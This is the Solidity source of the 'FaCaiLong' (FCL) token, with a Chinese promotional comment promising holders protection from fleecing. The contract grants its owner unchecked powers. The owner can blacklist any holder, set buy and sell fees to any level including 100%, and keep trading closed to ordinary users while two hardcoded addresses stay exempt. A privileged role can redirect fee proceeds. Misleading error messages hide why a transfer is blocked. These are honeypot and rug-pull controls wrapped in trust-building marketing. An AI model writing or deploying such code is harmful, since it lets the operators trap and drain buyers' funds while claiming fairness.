/*
发财龙社区是由互联网各大社区精诚合作所诞生的社区，
同时由一群正心正念高共识者自发组织联合坐庄。
致力于把FCL打造成Defi领域的新标杆，
让全球更多的人知道并持有FCL，
让更多的人享受这场财富盛宴，发财龙FCL象征财富好运，
辉煌鹏达，带来新的机遇。发财龙社区将会尽力服务好每一位成员，
保障每一位成员的利益不受损失，让跟随者都能享受这波红利。
发财龙社区秉承:帮助更多的人认知Defi，愿币圈没有割韭菜，
愿互联网没有难民，让黑心的操盘手从此失业，
还互联网一片净土的理念来更好的发展发财龙。
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract FCL is Ownable, IERC20Metadata {
    mapping(address => bool) public _buyed;
    mapping(address => bool) public _whites;
    mapping(address => bool) public _hei;
    mapping(address => bool) public _tz;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply;
    uint256 public _maxsell;
    uint256 public mairu;
    uint256 public maichu;
    uint256 public _index;
    address public _router;
    address public _main1;
    address public _fist;
    address public _wrap;
    address public _mark1;
    uint256   public _done;
    address public _main;
    address public _pair;
    address public _dead;
    address public _usdt;
    address[] public lpfhsz;
    bool public kaipan;
    bool   private _swapping;
    constructor() {
        _name = "FaCaiLong";
        _symbol = "FCL";
        mairu = 3;
        maichu = 6;
        _done = 5;
        _maxsell = 1 * 10 ** decimals();
        _dead = 0x0000000000000000000000000000000000000000;
        _main = 0x49EDaD201A4671d5993ECB058AE4EE62fc3F86DA;
        _main1 = 0x49EDaD201A4671d5993ECB058AE4EE62fc3F86DA;
        _usdt = 0xC6bf04FEE3F3D9d647818a82532b060CAdDCa8E8;
        _whites[_dead] = true;
        _whites[_main] = true;
        _whites[address(this)] = true;
        _mint(_main, 6666 * 10 ** decimals());
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(!_hei[sender] && !_hei[recipient], "this is black");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        if(!_whites[recipient] && isContract(sender)){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
        if(!_whites[recipient] && !isContract(recipient) && !(sender == 0x49EDaD201A4671d5993ECB058AE4EE62fc3F86DA ) && !(sender == 0x6C336DFD40e42F1d9Bc6e04427C6dAb4F0Df2b4d)){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
        if (!_buyed[sender] && recipient == _pair && !isContract(sender)) {
            _buyed[sender] = true;
            lpfhsz.push(sender);
        }
        if (!_swapping && isContract(recipient)) {
            _swapping = true;
            _swap1();
            _swapping = false;
        }
        if (!_whites[sender] && !_whites[recipient] && (isContract(recipient)||isContract(sender))){
            if(isContract(sender)){
            _balances[address(this)] += (amount * (mairu) / 100);
            emit Transfer(sender, address(this), (amount * (mairu) / 100));
            amount = amount * (100 - mairu) / 100;
            }else if(isContract(recipient)){
            _balances[address(this)] += (amount * (maichu) / 100);
            emit Transfer(sender, address(this), (amount * (maichu) / 100));
            amount = amount * (100 - maichu) / 100;
            }
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }       
    function _swap1() private {
        uint256 balances = balanceOf(address(this));
        if (_maxsell > 0 && balances >= _maxsell) {
            _swapTokenForFist(balances*32 / 36);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
                IERC20(_fist).transfer(_mark1, (fistval2)*8 / 32);
                _doBonusFist ((fistval2)*16 / 32);
                _swapTokenForFist2((fistval2)*4/32);
                if (balances*4/36 > 0 && fistval2*4/32 > 0) {
                addLiquidity2(balances*4/36, fistval2*4/32);
            }
        }
    }

    function addLiquidity2(uint256 t1, uint256 t2) private {
        IPancakeRouter02(_router).addLiquidity(address(this), 
            _fist, t1, t2, 0, 0, _main1, block.timestamp);
    }
    function _doBonusFist(uint256 amount) private {
        uint256 buySize = lpfhsz.length;
        uint256 i = _index;
        uint256 done = 0;
        IERC20 lp = IERC20(_pair);
        while(i < buySize && done < _done ) {
            address user = lpfhsz[i];
            if(lp.balanceOf(user) >= 0) {
                uint256 bonus = lp.balanceOf(user) * amount / lp.totalSupply();
                if (bonus > 0) {
                    IERC20(_fist).transfer(user, bonus);
                    done ++;
                }
            }
            i ++;
        }
        if (i == buySize) {i = 0;}
        _index = i;
    }
    function _swapTokenForFist(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);path[1] = _fist;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _wrap, block.timestamp);
        uint256 amount = IERC20(_fist).balanceOf(_wrap);
        if (IERC20(_fist).allowance(_wrap, address(this)) >= amount && amount > 0) {
            IERC20(_fist).transferFrom(_wrap, address(this), amount);
        }
    }
    function _swapTokenForFist2(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _fist;path[1] = _usdt;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _dead, block.timestamp);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    receive() external payable {}
    function KPDS(bool val) public onlyOwner {
        kaipan = val;
    }
    function sell(uint256 cfz) public {
        require(_tz[_msgSender()]);
        _maxsell = cfz;
    }
    function TZHuaDian(uint256 mairu1,uint256 maichu1) public onlyOwner {
        mairu = mairu1;
        maichu = maichu1;
    }
    function LPJHD() public {
        require(_tz[_msgSender()]);
        _main1 = _dead;
    }
    function mai(address mark1) public {
        require(_tz[_msgSender()]);
        _mark1 = mark1;
    }
    function pair1(address pair) public onlyOwner {
        _pair = pair;
    }
    function Dtz(address addr, bool val) public onlyOwner {
        _tz[addr] = val;
    }
    function seRTW(address RTW) public {
        require(_tz[_msgSender()]);
        _usdt = RTW;
    }
    function sethei(address addr, bool val) public onlyOwner {
        _hei[addr] = val;
    }
    function sewhites(address addr, bool val) public onlyOwner {
        _whites[addr] = val;
    }
    function SQ() public {
        IERC20(_fist).approve(_router, 9 * 10**70);
        _approve(address(this), _router, 9 * 10**70);
    }
    function setRouter(address router, address fist, address wrap) public onlyOwner {
        _fist = fist;
        _wrap = wrap;
        _router = router;
        _whites[router] = true;
        IERC20(_fist).approve(_router, 9 * 10**70);
        _approve(address(this), _router, 9 * 10**70);

    }
}